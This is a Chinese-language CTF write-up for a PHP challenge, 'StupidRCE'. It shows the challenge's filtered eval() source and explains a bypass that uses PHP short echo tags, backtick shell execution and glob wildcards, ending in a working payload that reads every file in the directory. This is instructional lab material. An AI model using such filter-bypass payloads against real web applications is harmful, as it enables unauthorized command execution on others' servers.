# StupidRCE

## 题目描述
- **提示**：无
- **考点**：`PHP短标签绕过`、正则表达式

## 解题思路
1. **信息收集**：无code参数传入时，`show_source(__FILE__);`直接泄露源码。
2. **源码分析**：将字母、数字、下划线、位运算、括号、方括号、花括号等该限制的都限制完了。
```bash
# 源码核心
$code = $_GET['code'];
if (strlen($code) > 18) die("...18cm");
if (preg_match("/\w/", $code)) die("i dislike it");              // 字母数字下划线
if (preg_match("/&|\||\^|\~|!/", $code)) die("stop calculating"); // 位运算
if (preg_match("/\(|\)/", $code)) die("call function is not safe"); // 括号
if (preg_match("/\{|\}|\[|\]/", $code)) die("fxcking brackets"); // 方括号花括号
if (preg_match("/\$|@|\./", $code)) die("...");                  // 变量/抑制/拼接
eval($code);
```
3. **找出对策**：由于正则表达式将有关命令执行的符号都进行了限制，只留下PHP短标签可以利用
```bash
# PHP短标签
一、<?= ... ?>
<?= ... ?> 是 <>php echo ...; ?>的快捷写法，专门用来输出表达式的结果
<?= $username ?> 等同于 <>php echo $username; ?>
二、<? ... ?>
和 <?php ... ?>一样，但是使用这个标签的前提是：需要在服务器的 php.ini 配置文件中开启 short_open_tag 才能生效。如果服务器没开启，你的代码会直接作为纯文本显示在网页上，导致程序出错，而这个标签默认是关闭的

重要：反引号`是shell_exec的语法糖，不需要函数括号，且shell利用?/*通配符代替字母：?匹配字母，*匹配任意文件名

基于此 我们使用第一种构造方式
```
4. **构造Payload**：
```bash
?><?=`/???/??? *`;
```
为啥这样构造：前面的`?>`是为了闭合前面的符号，使后面的内容能够进入HTML输出模式，然后就执行了后面的PHP代码，进而得到flag

## 运行结果
<img width="1344" height="822" alt="image" src="https://github.com/user-attachments/assets/7edb46dd-df96-4362-a8d6-91cebc466a7c" />
